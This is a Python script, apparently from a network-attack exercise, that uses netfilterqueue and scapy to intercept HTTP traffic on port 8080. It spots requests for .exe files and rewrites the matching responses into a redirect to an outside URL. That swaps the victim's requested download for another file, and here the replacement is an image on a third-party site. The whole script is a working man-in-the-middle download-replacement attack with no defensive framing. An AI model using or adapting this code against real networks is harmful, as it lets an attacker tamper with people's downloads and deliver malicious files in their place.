import netfilterqueue
import scapy.all as scapy
ack_list=[]
def set_load(scapy_packet,load):
    scapy_packet[scapy.Raw].load =load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum
    return str(scapy_packet)

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport==8080:
            print("HTTP Request")
            if b".exe" in scapy_packet[scapy.Raw].load and b"IP" not in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport==8080:
            print("HTTP RESPONSE")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet=set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation:https://www.reckontalk.com/wp-content/uploads/2015/07/hot-n-sexy-samantha-12.jpg")
                packet.set_payload(modified_packet)

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()